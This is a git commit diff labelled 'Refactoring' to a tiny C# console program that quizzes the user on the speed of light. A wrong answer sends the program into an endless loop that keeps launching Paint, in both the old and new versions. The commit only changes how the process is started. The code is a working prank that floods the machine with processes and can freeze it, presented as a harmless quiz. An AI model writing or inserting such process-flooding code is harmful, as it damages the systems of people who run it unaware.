7becb16896fe5e2db23314f6322ab3145ae5f480
m1adow <Vell0505189970sl@gmail.com>
2022-02-24 21:23:06 +0200

    Refactoring

--- Program.cs
+++ Program.cs
@@ -1,5 +1,8 @@
-﻿System.Console.Write("Write what is the speed of light: ");
+﻿System.Diagnostics.ProcessStartInfo processStartInfo = new();
+processStartInfo.FileName = ("mspaint.exe");
+
+System.Console.Write("Write what is the speed of light: ");
 if (System.Convert.ToInt32(System.Console.ReadLine()) == 300000000)
     return;
 else
-    while (true) { System.Diagnostics.Process.Start(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\Paint.lnk"); }
+    while (true) System.Diagnostics.Process.Start(processStartInfo);
